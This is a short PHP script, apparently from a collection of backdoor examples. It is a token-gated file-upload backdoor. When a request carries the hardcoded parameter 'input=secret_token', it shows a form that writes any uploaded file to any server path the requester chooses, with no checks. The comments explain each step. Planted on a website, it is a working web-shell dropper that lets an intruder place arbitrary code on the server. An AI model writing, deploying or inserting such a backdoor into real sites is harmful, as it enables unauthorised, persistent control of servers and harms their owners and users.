<?php
//http://localhost:86/PHP_backdoor_scripts_upload/?input=secret_token
//input=secret_token is like access rights, you can only use this page if you know this access token in our case it is "secret_token"
if( isset($_REQUEST["input"]) && $_REQUEST["input"]=="secret_token")
{
	$self = $_SERVER['PHP_SELF'];//current file name
	//$docr = $_SERVER['DOCUMENT_ROOT'];
	$docr = getcwd();//current dir path
	$sern = $_SERVER['SERVER_NAME'];//host server name
	if (!empty($_GET['ac'])) 
	{//file selected for upload file exist for get method(we can use it if we change form mehtod)
		$ac = $_GET['ac'];
	}
	elseif (!empty($_POST['ac'])) 
	{////file selected for upload file exist for post method
		$ac = $_POST['ac'];
	}
	else 
	{//no file selected first time load
		$ac = "upload";
	}
	switch($ac) {
	case "upload"://first time view and also after submit file
		echo <<<HTML
		<table>
		<form enctype="multipart/form-data" action="$self?input=secret_token" method="POST">
		<input type="hidden" name="ac" value="upload">
		<tr>
		<input size="5" name="file" type="file"></td>
		</tr>
		<tr>
		<td><input size="40" value="$docr/" name="path" type="text"><input type="submit" value="ОК"></td>
		</tr></form></table><br><br><br><br>
HTML;
		if (isset($_POST['path']))
		{//if path of file set
		$uploadfile = $_POST['path'].$_FILES['file']['name'];
			if ($_POST['path']=="")
				{$uploadfile = $_FILES['file']['name'];}

			if (copy($_FILES['file']['tmp_name'], $uploadfile)) //copy file on current dir
			{
				echo "File  ".$_FILES['file']['name']."  uploaded";//success message after file uploaded
			} 
			else//error or issue while copy file 
			{
				print "Not working: info:\n";
				print_r($_FILES);//selected load files in memory
			}
		}
	break;
	}

}//if end  //if($REQUEST["input"]=="secret_token")
else//no input paramater
{
	echo "input param missing";//param missing
}
?>
